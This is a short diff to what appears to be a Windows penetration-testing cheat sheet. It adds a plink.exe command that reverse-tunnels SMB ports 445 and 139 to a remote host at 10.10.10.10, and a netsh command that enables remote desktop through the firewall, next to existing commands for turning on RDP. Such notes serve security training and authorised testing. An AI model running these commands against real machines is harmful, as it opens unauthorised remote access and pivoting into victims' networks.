@@ -222,7 +222,7 @@ Get-RegistryAutoLogon
 
 - `netstat -ano`
 - Upload `plink.exe`
-- plink.exe -R "remote port":127.0.0.1:"local port" root@"ipaddress"
+- plink.exe -R 445:127.0.0.1:445 -R 139:127.0.0.1:139 root@10.10.10.10
 
 # Execute Powershell Scripts From cmd.exe
 
@@ -263,6 +263,8 @@ C:\WINDOWS\system32>reg add "hklm\system\currentControlSet\Control\Terminal Serv
 C:\WINDOWS\system32>sc config TermService start= auto
 C:\WINDOWS\system32>net start Termservice
 C:\WINDOWS\system32>netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
+# or also try:
+C:\WINDOWS\system32> netsh firewall set service type = remotedesktop mode = enable
 ```
 
 # Weak Permissions
